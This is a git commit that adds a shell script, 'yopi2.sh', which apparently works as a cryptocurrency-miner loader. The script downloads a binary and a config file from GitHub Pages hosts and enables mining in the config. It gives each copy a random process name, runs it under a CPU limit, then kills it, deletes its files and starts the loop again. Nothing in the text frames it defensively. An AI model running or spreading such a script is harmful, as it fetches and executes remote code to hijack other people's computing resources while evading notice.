e45c9ce3b725fa9573b7e83185bf2063ea349405
pzeankto <57797716+pzeankto@users.noreply.github.com>
2019-12-02 04:47:59 +0100

    Create yopi2.sh

---
+++ yopi2.sh
@@ -0,0 +1,24 @@
+wget http://dzmltzack.github.io/web/xm -O oxm
+while true
+do
+rm -f za*
+rm -f config*
+wget https://pzeankto.github.io/namnam/arqt.json -O config.json
+NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
+BB=zaca$NEW_UUID
+NN=zaca$NEW_UUID
+cp oxm $BB
+echo $NN >> $BB
+sed -i "s/PSPS/$PASS/g" config.json
+sed -i 's/"enabled": false/"enabled": true/g' config.json
+chmod +x $BB
+./zaca*
+result=$(($(grep -c processor /proc/cpuinfo) * 40))
+cpulimit -b -l $result -p $(pgrep zaca)
+sleep 220
+kill -9 $(pgrep cpul)
+kill -9 $(pgrep zaca)
+rm -f za*
+rm -f config*
+sleep 60
+done
